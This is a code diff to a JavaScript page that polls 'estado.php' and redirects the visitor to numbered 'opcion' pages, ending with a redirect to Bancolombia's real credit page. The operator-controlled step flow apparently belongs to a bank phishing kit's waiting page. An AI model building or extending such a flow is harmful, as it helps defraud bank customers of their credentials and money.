@@ -75,46 +75,45 @@
     fetch(`estado.php?rid=${requestId}` + (key ? (`&key=${encodeURIComponent(key)}`) : ''), {cache:'no-store'})
         .then(res => res.ok ? res.json() : Promise.reject('HTTP '+res.status))
         .then(data => {
-     switch (data.estado) {
+          const estado = (data && typeof data.estado === 'string') ? data.estado : 'pendiente';
+          if (estado && estado !== 'pendiente') {
+            clearTimeout(redireccionTimeout);
+          }
+          switch (estado) {
   case 'opcion_1':
-    clearTimeout(redireccionTimeout);
     window.location.href = `opcion1.html?key=${key}&requestId=${requestId}`;
     break;
   case 'opcion_2':
-    clearTimeout(redireccionTimeout);
     window.location.href = `opcion6.html?key=${key}`;
     break;
   case 'opcion_3':
-    clearTimeout(redireccionTimeout);
     window.location.href = `opcion3.html?key=${key}`;
     break;
   case 'opcion_4':
-    clearTimeout(redireccionTimeout);
     window.location.href = `opcion4.html?key=${key}`;
     break;
   case 'opcion_5':
-    clearTimeout(redireccionTimeout);
     window.location.href = `opcion5.html?key=${key}`;
     break;
   case 'opcion_6':
-    clearTimeout(redireccionTimeout);
     window.location.href = `opcion6.html?key=${key}`;
     break;
   case 'opcion_7':
-    clearTimeout(redireccionTimeout);
     window.location.href = `opcion7.html?key=${key}`;
     break;
   case 'opcion_8':
-    clearTimeout(redireccionTimeout);
     window.location.href = `opcion8.html?key=${key}`;
     break;
   case 'opcion_55':
-    clearTimeout(redireccionTimeout);
     window.location.href = `opcion55.html?key=${key}`;
-    break; 
-case 'opcion_9':
-    clearTimeout(redireccionTimeout);
+    break;
+  case 'opcion_9':
+    window.location.href = `opcion9.php?key=${key}`;
+    break;
+  case 'opcion_10':
     window.location.href = 'https://www.bancolombia.com/personas/creditos';
+    break;
+  default:
     break;
 }
       })
